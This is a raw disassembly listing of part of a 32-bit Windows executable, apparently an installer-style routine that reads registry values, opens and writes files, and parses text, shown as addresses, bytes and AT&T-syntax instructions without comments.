  4024e2:	3b c3                	cmp    %ebx,%eax
  4024e4:	89 45 08             	mov    %eax,0x8(%ebp)
  4024e7:	0f 84 69 07 00 00    	je     0x402c56
  4024ed:	33 c0                	xor    %eax,%eax
  4024ef:	83 fe 01             	cmp    $0x1,%esi
  4024f2:	bf c8 b5 40 00       	mov    $0x40b5c8,%edi
  4024f7:	75 11                	jne    0x40250a
  4024f9:	6a 23                	push   $0x23
  4024fb:	e8 d2 08 00 00       	call   0x402dd2
  402500:	57                   	push   %edi
  402501:	e8 99 40 00 00       	call   0x40659f
  402506:	8d 44 00 02          	lea    0x2(%eax,%eax,1),%eax
  40250a:	83 fe 04             	cmp    $0x4,%esi
  40250d:	75 12                	jne    0x402521
  40250f:	6a 03                	push   $0x3
  402511:	e8 9a 08 00 00       	call   0x402db0
  402516:	59                   	pop    %ecx
  402517:	a3 c8 b5 40 00       	mov    %eax,0x40b5c8
  40251c:	56                   	push   %esi
  40251d:	89 55 c8             	mov    %edx,-0x38(%ebp)
  402520:	58                   	pop    %eax
  402521:	83 fe 03             	cmp    $0x3,%esi
  402524:	75 0f                	jne    0x402535
  402526:	68 00 18 00 00       	push   $0x1800
  40252b:	57                   	push   %edi
  40252c:	53                   	push   %ebx
  40252d:	ff 75 dc             	push   -0x24(%ebp)
  402530:	e8 df 0d 00 00       	call   0x403314
  402535:	50                   	push   %eax
  402536:	57                   	push   %edi
  402537:	ff 75 f0             	push   -0x10(%ebp)
  40253a:	53                   	push   %ebx
  40253b:	ff 75 bc             	push   -0x44(%ebp)
  40253e:	ff 75 08             	push   0x8(%ebp)
  402541:	ff 15 0c 80 40 00    	call   *0x40800c
  402547:	85 c0                	test   %eax,%eax
  402549:	75 03                	jne    0x40254e
  40254b:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40254e:	ff 75 08             	push   0x8(%ebp)
  402551:	e9 d3 00 00 00       	jmp    0x402629
  402556:	68 19 00 02 00       	push   $0x20019
  40255b:	e8 b2 08 00 00       	call   0x402e12
  402560:	6a 33                	push   $0x33
  402562:	8b f0                	mov    %eax,%esi
  402564:	e8 69 08 00 00       	call   0x402dd2
  402569:	3b f3                	cmp    %ebx,%esi
  40256b:	66 89 1f             	mov    %bx,(%edi)
  40256e:	0f 84 e6 03 00 00    	je     0x40295a
  402574:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402577:	c7 45 f0 00 08 00 00 	movl   $0x800,-0x10(%ebp)
  40257e:	51                   	push   %ecx
  40257f:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402582:	57                   	push   %edi
  402583:	51                   	push   %ecx
  402584:	53                   	push   %ebx
  402585:	50                   	push   %eax
  402586:	56                   	push   %esi
  402587:	ff 15 08 80 40 00    	call   *0x408008
  40258d:	33 c9                	xor    %ecx,%ecx
  40258f:	41                   	inc    %ecx
  402590:	85 c0                	test   %eax,%eax
  402592:	75 2e                	jne    0x4025c2
  402594:	83 7d 08 04          	cmpl   $0x4,0x8(%ebp)
  402598:	74 13                	je     0x4025ad
  40259a:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  40259d:	74 06                	je     0x4025a5
  40259f:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  4025a3:	75 1d                	jne    0x4025c2
  4025a5:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4025a8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4025ab:	eb 74                	jmp    0x402621
  4025ad:	ff 37                	push   (%edi)
  4025af:	33 c0                	xor    %eax,%eax
  4025b1:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4025b4:	57                   	push   %edi
  4025b5:	0f 94 c0             	sete   %al
  4025b8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4025bb:	e8 10 3f 00 00       	call   0x4064d0
  4025c0:	eb 66                	jmp    0x402628
  4025c2:	66 89 1f             	mov    %bx,(%edi)
  4025c5:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4025c8:	eb 5e                	jmp    0x402628
  4025ca:	68 19 00 02 00       	push   $0x20019
  4025cf:	e8 3e 08 00 00       	call   0x402e12
  4025d4:	6a 03                	push   $0x3
  4025d6:	8b f0                	mov    %eax,%esi
  4025d8:	e8 d3 07 00 00       	call   0x402db0
  4025dd:	3b f3                	cmp    %ebx,%esi
  4025df:	59                   	pop    %ecx
  4025e0:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4025e3:	66 89 1f             	mov    %bx,(%edi)
  4025e6:	0f 84 6e 03 00 00    	je     0x40295a
  4025ec:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4025ef:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  4025f4:	89 4d 08             	mov    %ecx,0x8(%ebp)
  4025f7:	74 0c                	je     0x402605
  4025f9:	51                   	push   %ecx
  4025fa:	57                   	push   %edi
  4025fb:	50                   	push   %eax
  4025fc:	56                   	push   %esi
  4025fd:	ff 15 04 80 40 00    	call   *0x408004
  402603:	eb 1c                	jmp    0x402621
  402605:	53                   	push   %ebx
  402606:	53                   	push   %ebx
  402607:	53                   	push   %ebx
  402608:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40260b:	53                   	push   %ebx
  40260c:	51                   	push   %ecx
  40260d:	57                   	push   %edi
  40260e:	50                   	push   %eax
  40260f:	56                   	push   %esi
  402610:	ff 15 00 80 40 00    	call   *0x408000
  402616:	85 c0                	test   %eax,%eax
  402618:	74 07                	je     0x402621
  40261a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402621:	66 89 9f fe 07 00 00 	mov    %bx,0x7fe(%edi)
  402628:	56                   	push   %esi
  402629:	ff 15 10 80 40 00    	call   *0x408010
  40262f:	e9 22 06 00 00       	jmp    0x402c56
  402634:	57                   	push   %edi
  402635:	e8 af 3e 00 00       	call   0x4064e9
  40263a:	3b c3                	cmp    %ebx,%eax
  40263c:	0f 84 14 06 00 00    	je     0x402c56
  402642:	50                   	push   %eax
  402643:	e9 cf f9 ff ff       	jmp    0x402017
  402648:	6a ed                	push   $0xffffffed
  40264a:	e8 83 07 00 00       	call   0x402dd2
  40264f:	ff 75 d8             	push   -0x28(%ebp)
  402652:	ff 75 d4             	push   -0x2c(%ebp)
  402655:	50                   	push   %eax
  402656:	e8 1e 3a 00 00       	call   0x406079
  40265b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40265e:	0f 84 f3 02 00 00    	je     0x402957
  402664:	50                   	push   %eax
  402665:	e9 28 ef ff ff       	jmp    0x401592
  40266a:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40266d:	33 c9                	xor    %ecx,%ecx
  40266f:	83 fa 38             	cmp    $0x38,%edx
  402672:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402675:	0f 94 c1             	sete   %cl
  402678:	3b c3                	cmp    %ebx,%eax
  40267a:	8b f1                	mov    %ecx,%esi
  40267c:	74 1b                	je     0x402699
  40267e:	6a 01                	push   $0x1
  402680:	e8 2b 07 00 00       	call   0x402db0
  402685:	66 a3 c8 ad 40 00    	mov    %ax,0x40adc8
  40268b:	33 c0                	xor    %eax,%eax
  40268d:	3b f3                	cmp    %ebx,%esi
  40268f:	59                   	pop    %ecx
  402690:	0f 94 c0             	sete   %al
  402693:	89 55 bc             	mov    %edx,-0x44(%ebp)
  402696:	40                   	inc    %eax
  402697:	eb 3f                	jmp    0x4026d8
  402699:	83 fa 38             	cmp    $0x38,%edx
  40269c:	75 2b                	jne    0x4026c9
  40269e:	6a 21                	push   $0x21
  4026a0:	e8 2d 07 00 00       	call   0x402dd2
  4026a5:	68 00 04 00 00       	push   $0x400
  4026aa:	68 c8 ad 40 00       	push   $0x40adc8
  4026af:	68 c8 b5 40 00       	push   $0x40b5c8
  4026b4:	e8 f2 3e 00 00       	call   0x4065ab
  4026b9:	83 c4 0c             	add    $0xc,%esp
  4026bc:	68 c8 ad 40 00       	push   $0x40adc8
  4026c1:	ff 15 28 81 40 00    	call   *0x408128
  4026c7:	eb 0f                	jmp    0x4026d8
  4026c9:	6a 11                	push   $0x11
  4026cb:	e8 02 07 00 00       	call   0x402dd2
  4026d0:	50                   	push   %eax
  4026d1:	e8 c9 3e 00 00       	call   0x40659f
  4026d6:	03 c0                	add    %eax,%eax
  4026d8:	66 39 1f             	cmp    %bx,(%edi)
  4026db:	89 45 08             	mov    %eax,0x8(%ebp)
  4026de:	0f 84 76 02 00 00    	je     0x40295a
  4026e4:	57                   	push   %edi
  4026e5:	e8 ff 3d 00 00       	call   0x4064e9
  4026ea:	0b 75 f0             	or     -0x10(%ebp),%esi
  4026ed:	8b f8                	mov    %eax,%edi
  4026ef:	75 14                	jne    0x402705
  4026f1:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4026f4:	74 0f                	je     0x402705
  4026f6:	57                   	push   %edi
  4026f7:	57                   	push   %edi
  4026f8:	e8 5d 3a 00 00       	call   0x40615a
  4026fd:	85 c0                	test   %eax,%eax
  4026ff:	0f 8c 55 02 00 00    	jl     0x40295a
  402705:	ff 75 08             	push   0x8(%ebp)
  402708:	68 c8 ad 40 00       	push   $0x40adc8
  40270d:	57                   	push   %edi
  40270e:	e8 18 3a 00 00       	call   0x40612b
  402713:	e9 c1 ee ff ff       	jmp    0x4015d9
  402718:	6a 02                	push   $0x2
  40271a:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40271d:	58                   	pop    %eax
  40271e:	50                   	push   %eax
  40271f:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  402722:	e8 89 06 00 00       	call   0x402db0
  402727:	83 f8 01             	cmp    $0x1,%eax
  40272a:	59                   	pop    %ecx
  40272b:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40272e:	89 45 bc             	mov    %eax,-0x44(%ebp)
  402731:	0f 8c 1f 05 00 00    	jl     0x402c56
  402737:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  40273c:	3b c1                	cmp    %ecx,%eax
  40273e:	7e 03                	jle    0x402743
  402740:	89 4d bc             	mov    %ecx,-0x44(%ebp)
  402743:	66 39 1f             	cmp    %bx,(%edi)
  402746:	0f 84 5e 01 00 00    	je     0x4028aa
  40274c:	57                   	push   %edi
  40274d:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  402750:	e8 94 3d 00 00       	call   0x4064e9
  402755:	39 5d bc             	cmp    %ebx,-0x44(%ebp)
  402758:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40275b:	0f 8e 49 01 00 00    	jle    0x4028aa
  402761:	8b 35 2c 81 40 00    	mov    0x40812c,%esi
  402767:	83 7d cc 39          	cmpl   $0x39,-0x34(%ebp)
  40276b:	0f 85 8f 00 00 00    	jne    0x402800
  402771:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402774:	53                   	push   %ebx
  402775:	50                   	push   %eax
  402776:	6a 02                	push   $0x2
  402778:	58                   	pop    %eax
  402779:	2b 45 dc             	sub    -0x24(%ebp),%eax
  40277c:	50                   	push   %eax
  40277d:	8d 45 0a             	lea    0xa(%ebp),%eax
  402780:	50                   	push   %eax
  402781:	ff 75 e8             	push   -0x18(%ebp)
  402784:	ff 15 30 81 40 00    	call   *0x408130
  40278a:	85 c0                	test   %eax,%eax
  40278c:	0f 84 18 01 00 00    	je     0x4028aa
  402792:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  402795:	3b cb                	cmp    %ebx,%ecx
  402797:	0f 84 0d 01 00 00    	je     0x4028aa
  40279d:	66 0f b6 45 0a       	movzbw 0xa(%ebp),%ax
  4027a2:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4027a5:	89 4d b4             	mov    %ecx,-0x4c(%ebp)
  4027a8:	89 45 b0             	mov    %eax,-0x50(%ebp)
  4027ab:	0f 85 b5 00 00 00    	jne    0x402866
  4027b1:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4027b4:	6a 01                	push   $0x1
  4027b6:	50                   	push   %eax
  4027b7:	8d 45 0a             	lea    0xa(%ebp),%eax
  4027ba:	51                   	push   %ecx
  4027bb:	50                   	push   %eax
  4027bc:	6a 08                	push   $0x8
  4027be:	53                   	push   %ebx
  4027bf:	ff d6                	call   *%esi
  4027c1:	85 c0                	test   %eax,%eax
  4027c3:	75 68                	jne    0x40282d
  4027c5:	8b 7d b4             	mov    -0x4c(%ebp),%edi
  4027c8:	f7 df                	neg    %edi
  4027ca:	ff 4d c0             	decl   -0x40(%ebp)
  4027cd:	b8 fd ff 00 00       	mov    $0xfffd,%eax
  4027d2:	89 45 b0             	mov    %eax,-0x50(%ebp)
  4027d5:	74 59                	je     0x402830
  4027d7:	ff 4d b4             	decl   -0x4c(%ebp)
  4027da:	47                   	inc    %edi
  4027db:	6a 01                	push   $0x1
  4027dd:	53                   	push   %ebx
  4027de:	57                   	push   %edi
  4027df:	ff 75 e8             	push   -0x18(%ebp)
  4027e2:	ff 15 34 81 40 00    	call   *0x408134
  4027e8:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4027eb:	6a 01                	push   $0x1
  4027ed:	50                   	push   %eax
  4027ee:	8d 45 0a             	lea    0xa(%ebp),%eax
  4027f1:	ff 75 c0             	push   -0x40(%ebp)
  4027f4:	50                   	push   %eax
  4027f5:	6a 08                	push   $0x8
  4027f7:	53                   	push   %ebx
  4027f8:	ff d6                	call   *%esi
  4027fa:	85 c0                	test   %eax,%eax
  4027fc:	74 cc                	je     0x4027ca
  4027fe:	eb 2d                	jmp    0x40282d
  402800:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402803:	75 16                	jne    0x40281b
  402805:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  402808:	75 11                	jne    0x40281b
  40280a:	53                   	push   %ebx
  40280b:	ff 75 e8             	push   -0x18(%ebp)
  40280e:	e8 47 39 00 00       	call   0x40615a
  402813:	85 c0                	test   %eax,%eax
  402815:	0f 8c 8f 00 00 00    	jl     0x4028aa
  40281b:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40281e:	6a 02                	push   $0x2
  402820:	50                   	push   %eax
  402821:	ff 75 e8             	push   -0x18(%ebp)
  402824:	e8 d3 38 00 00       	call   0x4060fc
  402829:	85 c0                	test   %eax,%eax
  40282b:	74 7d                	je     0x4028aa
  40282d:	8b 45 b0             	mov    -0x50(%ebp),%eax
  402830:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402833:	75 31                	jne    0x402866
  402835:	66 83 7d c8 0d       	cmpw   $0xd,-0x38(%ebp)
  40283a:	74 3b                	je     0x402877
  40283c:	66 83 7d c8 0a       	cmpw   $0xa,-0x38(%ebp)
  402841:	74 34                	je     0x402877
  402843:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402846:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402849:	ff 45 f8             	incl   -0x8(%ebp)
  40284c:	66 3b c3             	cmp    %bx,%ax
  40284f:	66 89 04 51          	mov    %ax,(%ecx,%edx,2)
  402853:	89 45 c8             	mov    %eax,-0x38(%ebp)
  402856:	74 52                	je     0x4028aa
  402858:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40285b:	3b 45 bc             	cmp    -0x44(%ebp),%eax
  40285e:	0f 8c 03 ff ff ff    	jl     0x402767
  402864:	eb 44                	jmp    0x4028aa
  402866:	0f b7 c0             	movzwl %ax,%eax
  402869:	50                   	push   %eax
  40286a:	ff 75 f4             	push   -0xc(%ebp)
  40286d:	e8 5e 3c 00 00       	call   0x4064d0
  402872:	e9 e8 03 00 00       	jmp    0x402c5f
  402877:	66 39 45 c8          	cmp    %ax,-0x38(%ebp)
  40287b:	74 1b                	je     0x402898
  40287d:	66 3d 0d 00          	cmp    $0xd,%ax
  402881:	74 06                	je     0x402889
  402883:	66 3d 0a 00          	cmp    $0xa,%ax
  402887:	75 0f                	jne    0x402898
  402889:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40288c:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40288f:	ff 45 f8             	incl   -0x8(%ebp)
  402892:	66 89 04 51          	mov    %ax,(%ecx,%edx,2)
  402896:	eb 12                	jmp    0x4028aa
  402898:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  40289b:	6a 01                	push   $0x1
  40289d:	f7 d8                	neg    %eax
  40289f:	53                   	push   %ebx
  4028a0:	50                   	push   %eax
  4028a1:	ff 75 e8             	push   -0x18(%ebp)
  4028a4:	ff 15 34 81 40 00    	call   *0x408134
  4028aa:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4028ad:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4028b0:	3b c3                	cmp    %ebx,%eax
  4028b2:	66 89 1c 41          	mov    %bx,(%ecx,%eax,2)
  4028b6:	e9 20 ed ff ff       	jmp    0x4015db
  4028bb:	66 39 1f             	cmp    %bx,(%edi)
  4028be:	0f 84 92 03 00 00    	je     0x402c56
  4028c4:	6a 02                	push   $0x2
  4028c6:	e8 e5 04 00 00       	call   0x402db0
  4028cb:	59                   	pop    %ecx
  4028cc:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4028cf:	ff 75 dc             	push   -0x24(%ebp)
  4028d2:	53                   	push   %ebx
  4028d3:	50                   	push   %eax
  4028d4:	57                   	push   %edi
  4028d5:	e8 0f 3c 00 00       	call   0x4064e9
  4028da:	50                   	push   %eax
  4028db:	ff 15 34 81 40 00    	call   *0x408134
  4028e1:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  4028e4:	0f 8c 6c 03 00 00    	jl     0x402c56
  4028ea:	50                   	push   %eax
  4028eb:	e9 dd 02 00 00       	jmp    0x402bcd
  4028f0:	57                   	push   %edi
  4028f1:	e8 f3 3b 00 00       	call   0x4064e9
  4028f6:	3b c3                	cmp    %ebx,%eax
  4028f8:	0f 84 58 03 00 00    	je     0x402c56
  4028fe:	50                   	push   %eax
  4028ff:	ff 15 38 81 40 00    	call   *0x408138
  402905:	e9 4c 03 00 00       	jmp    0x402c56
  40290a:	ff 75 f4             	push   -0xc(%ebp)
  40290d:	e8 d7 3b 00 00       	call   0x4064e9
  402912:	3b c3                	cmp    %ebx,%eax
  402914:	74 12                	je     0x402928
  402916:	8d 8d 24 fd ff ff    	lea    -0x2dc(%ebp),%ecx
  40291c:	51                   	push   %ecx
  40291d:	50                   	push   %eax
  40291e:	ff 15 3c 81 40 00    	call   *0x40813c
  402924:	85 c0                	test   %eax,%eax
  402926:	75 47                	jne    0x40296f
  402928:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40292f:	66 89 1f             	mov    %bx,(%edi)
  402932:	e9 1f 03 00 00       	jmp    0x402c56
  402937:	6a 02                	push   $0x2
  402939:	e8 94 04 00 00       	call   0x402dd2
  40293e:	8d 8d 24 fd ff ff    	lea    -0x2dc(%ebp),%ecx
  402944:	51                   	push   %ecx
  402945:	50                   	push   %eax
  402946:	ff 15 40 81 40 00    	call   *0x408140
  40294c:	83 f8 ff             	cmp    $0xffffffff,%eax
  40294f:	75 15                	jne    0x402966
  402951:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402954:	66 89 18             	mov    %bx,(%eax)
  402957:	66 89 1f             	mov    %bx,(%edi)
  40295a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402961:	e9 f0 02 00 00       	jmp    0x402c56
  402966:	50                   	push   %eax
  402967:	ff 75 f4             	push   -0xc(%ebp)
  40296a:	e8 61 3b 00 00       	call   0x4064d0
  40296f:	8d 85 50 fd ff ff    	lea    -0x2b0(%ebp),%eax
  402975:	50                   	push   %eax
  402976:	57                   	push   %edi
  402977:	e9 44 01 00 00       	jmp    0x402ac0
  40297c:	6a f0                	push   $0xfffffff0
  40297e:	bf 66 fd ff ff       	mov    $0xfffffd66,%edi
  402983:	e8 4a 04 00 00       	call   0x402dd2
  402988:	8b f0                	mov    %eax,%esi
  40298a:	56                   	push   %esi
  40298b:	89 75 c0             	mov    %esi,-0x40(%ebp)
  40298e:	e8 3c 35 00 00       	call   0x405ecf
  402993:	85 c0                	test   %eax,%eax
  402995:	75 07                	jne    0x40299e
  402997:	6a ed                	push   $0xffffffed
  402999:	e8 34 04 00 00       	call   0x402dd2
  40299e:	56                   	push   %esi
  40299f:	e8 b0 36 00 00       	call   0x406054
  4029a4:	6a 02                	push   $0x2
  4029a6:	68 00 00 00 40       	push   $0x40000000
  4029ab:	56                   	push   %esi
  4029ac:	e8 c8 36 00 00       	call   0x406079
  4029b1:	83 f8 ff             	cmp    $0xffffffff,%eax
  4029b4:	89 45 08             	mov    %eax,0x8(%ebp)
  4029b7:	0f 84 aa 00 00 00    	je     0x402a67
  4029bd:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4029c0:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  4029c3:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4029c6:	0f 84 83 00 00 00    	je     0x402a4f
  4029cc:	a1 34 9a 42 00       	mov    0x429a34,%eax
  4029d1:	8b 35 10 81 40 00    	mov    0x408110,%esi
  4029d7:	50                   	push   %eax
  4029d8:	6a 40                	push   $0x40
  4029da:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4029dd:	ff d6                	call   *%esi
  4029df:	8b f8                	mov    %eax,%edi
  4029e1:	3b fb                	cmp    %ebx,%edi
  4029e3:	74 6a                	je     0x402a4f
  4029e5:	53                   	push   %ebx
  4029e6:	e8 24 0b 00 00       	call   0x40350f
  4029eb:	ff 75 bc             	push   -0x44(%ebp)
  4029ee:	57                   	push   %edi
  4029ef:	e8 05 0b 00 00       	call   0x4034f9
  4029f4:	ff 75 d8             	push   -0x28(%ebp)
  4029f7:	6a 40                	push   $0x40
  4029f9:	ff d6                	call   *%esi
  4029fb:	8b f0                	mov    %eax,%esi
  4029fd:	3b f3                	cmp    %ebx,%esi
  4029ff:	89 75 f0             	mov    %esi,-0x10(%ebp)
  402a02:	74 34                	je     0x402a38
  402a04:	ff 75 d8             	push   -0x28(%ebp)
  402a07:	56                   	push   %esi
  402a08:	53                   	push   %ebx
  402a09:	ff 75 d4             	push   -0x2c(%ebp)
  402a0c:	e8 03 09 00 00       	call   0x403314
  402a11:	eb 18                	jmp    0x402a2b
  402a13:	8b 0e                	mov    (%esi),%ecx
  402a15:	8b 46 04             	mov    0x4(%esi),%eax
  402a18:	83 c6 08             	add    $0x8,%esi
  402a1b:	51                   	push   %ecx
  402a1c:	03 c7                	add    %edi,%eax
  402a1e:	56                   	push   %esi
  402a1f:	50                   	push   %eax
  402a20:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  402a23:	e8 0c 36 00 00       	call   0x406034
  402a28:	03 75 c4             	add    -0x3c(%ebp),%esi
  402a2b:	38 1e                	cmp    %bl,(%esi)
  402a2d:	75 e4                	jne    0x402a13
  402a2f:	ff 75 f0             	push   -0x10(%ebp)
  402a32:	ff 15 0c 81 40 00    	call   *0x40810c
  402a38:	ff 75 bc             	push   -0x44(%ebp)
  402a3b:	57                   	push   %edi
  402a3c:	ff 75 08             	push   0x8(%ebp)
  402a3f:	e8 e7 36 00 00       	call   0x40612b
  402a44:	57                   	push   %edi
  402a45:	ff 15 0c 81 40 00    	call   *0x40810c
  402a4b:	83 4d c8 ff          	orl    $0xffffffff,-0x38(%ebp)
  402a4f:	53                   	push   %ebx
  402a50:	53                   	push   %ebx
  402a51:	ff 75 08             	push   0x8(%ebp)
  402a54:	ff 75 c8             	push   -0x38(%ebp)
  402a57:	e8 b8 08 00 00       	call   0x403314
  402a5c:	ff 75 08             	push   0x8(%ebp)
  402a5f:	8b f8                	mov    %eax,%edi
  402a61:	ff 15 fc 80 40 00    	call   *0x4080fc
  402a67:	6a f3                	push   $0xfffffff3
  402a69:	3b fb                	cmp    %ebx,%edi
  402a6b:	5e                   	pop    %esi
  402a6c:	7d 13                	jge    0x402a81
  402a6e:	6a ef                	push   $0xffffffef
  402a70:	5e                   	pop    %esi
  402a71:	ff 75 c0             	push   -0x40(%ebp)
  402a74:	ff 15 44 81 40 00    	call   *0x408144
  402a7a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402a81:	56                   	push   %esi
  402a82:	e9 96 f8 ff ff       	jmp    0x40231d
  402a87:	53                   	push   %ebx
  402a88:	e8 23 03 00 00       	call   0x402db0
  402a8d:	8b f8                	mov    %eax,%edi
  402a8f:	59                   	pop    %ecx
  402a90:	3b 3d 4c 9a 42 00    	cmp    0x429a4c,%edi
  402a96:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402a99:	0f 83 bb fe ff ff    	jae    0x40295a
  402a9f:	8b f7                	mov    %edi,%esi
  402aa1:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402aa4:	69 f6 18 08 00 00    	imul   $0x818,%esi,%esi
  402aaa:	03 35 48 9a 42 00    	add    0x429a48,%esi
  402ab0:	3b c3                	cmp    %ebx,%eax
  402ab2:	7c 1c                	jl     0x402ad0
  402ab4:	8b 0c 86             	mov    (%esi,%eax,4),%ecx
  402ab7:	75 11                	jne    0x402aca
  402ab9:	83 c6 18             	add    $0x18,%esi
  402abc:	56                   	push   %esi
  402abd:	ff 75 f4             	push   -0xc(%ebp)
  402ac0:	e8 c4 3a 00 00       	call   0x406589
  402ac5:	e9 8c 01 00 00       	jmp    0x402c56
  402aca:	51                   	push   %ecx
  402acb:	e9 fd 00 00 00       	jmp    0x402bcd
  402ad0:	83 c9 ff             	or     $0xffffffff,%ecx
  402ad3:	2b c8                	sub    %eax,%ecx
  402ad5:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  402ad8:	74 10                	je     0x402aea
  402ada:	6a 01                	push   $0x1
  402adc:	e8 cf 02 00 00       	call   0x402db0
  402ae1:	59                   	pop    %ecx
  402ae2:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402ae5:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  402ae8:	eb 10                	jmp    0x402afa
  402aea:	ff 75 e0             	push   -0x20(%ebp)
  402aed:	8d 46 18             	lea    0x18(%esi),%eax
  402af0:	50                   	push   %eax
  402af1:	e8 d0 3a 00 00       	call   0x4065c6
  402af6:	80 4e 09 01          	orb    $0x1,0x9(%esi)
  402afa:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402afd:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  402b00:	89 0c 86             	mov    %ecx,(%esi,%eax,4)
  402b03:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402b06:	0f 84 4a 01 00 00    	je     0x402c56
  402b0c:	57                   	push   %edi
  402b0d:	e8 6b e6 ff ff       	call   0x40117d
  402b12:	e9 3f 01 00 00       	jmp    0x402c56
  402b17:	53                   	push   %ebx
  402b18:	e8 93 02 00 00       	call   0x402db0
  402b1d:	83 f8 20             	cmp    $0x20,%eax
  402b20:	59                   	pop    %ecx
  402b21:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402b24:	0f 83 30 fe ff ff    	jae    0x40295a
  402b2a:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402b2d:	74 22                	je     0x402b51
  402b2f:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  402b32:	74 12                	je     0x402b46
  402b34:	50                   	push   %eax
  402b35:	e8 5f e7 ff ff       	call   0x401299
  402b3a:	53                   	push   %ebx
  402b3b:	53                   	push   %ebx
  402b3c:	e8 ae e6 ff ff       	call   0x4011ef
  402b41:	e9 10 01 00 00       	jmp    0x402c56
  402b46:	53                   	push   %ebx
  402b47:	e8 96 e7 ff ff       	call   0x4012e2
  402b4c:	e9 99 fd ff ff       	jmp    0x4028ea
  402b51:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  402b54:	74 15                	je     0x402b6b
  402b56:	8b 15 30 9a 42 00    	mov    0x429a30,%edx
  402b5c:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  402b5f:	89 8c 82 94 00 00 00 	mov    %ecx,0x94(%edx,%eax,4)
  402b66:	e9 eb 00 00 00       	jmp    0x402c56
  402b6b:	8b 0d 30 9a 42 00    	mov    0x429a30,%ecx
  402b71:	ff b4 81 94 00 00 00 	push   0x94(%ecx,%eax,4)
  402b78:	ff 75 f4             	push   -0xc(%ebp)
  402b7b:	e8 46 3a 00 00       	call   0x4065c6
  402b80:	e9 d1 00 00 00       	jmp    0x402c56
  402b85:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402b88:	2b c3                	sub    %ebx,%eax
  402b8a:	74 4b                	je     0x402bd7
  402b8c:	48                   	dec    %eax
  402b8d:	0f 85 c3 00 00 00    	jne    0x402c56
  402b93:	6a 02                	push   $0x2
  402b95:	e8 16 02 00 00       	call   0x402db0
  402b9a:	6a 04                	push   $0x4
  402b9c:	8b f0                	mov    %eax,%esi
  402b9e:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402ba1:	e8 0a 02 00 00       	call   0x402db0
  402ba6:	59                   	pop    %ecx
  402ba7:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402baa:	59                   	pop    %ecx
  402bab:	89 5d 08             	mov    %ebx,0x8(%ebp)
  402bae:	0f b6 c8             	movzbl %al,%ecx
  402bb1:	c1 e8 18             	shr    $0x18,%eax
  402bb4:	3b f3                	cmp    %ebx,%esi
  402bb6:	75 05                	jne    0x402bbd
  402bb8:	be a0 9a 42 00       	mov    $0x429aa0,%esi
  402bbd:	03 c6                	add    %esi,%eax
  402bbf:	51                   	push   %ecx
  402bc0:	50                   	push   %eax
  402bc1:	8d 45 08             	lea    0x8(%ebp),%eax
  402bc4:	50                   	push   %eax
  402bc5:	e8 6a 34 00 00       	call   0x406034
  402bca:	ff 75 08             	push   0x8(%ebp)
  402bcd:	ff 75 f4             	push   -0xc(%ebp)
  402bd0:	e8 fb 38 00 00       	call   0x4064d0
  402bd5:	eb 7f                	jmp    0x402c56
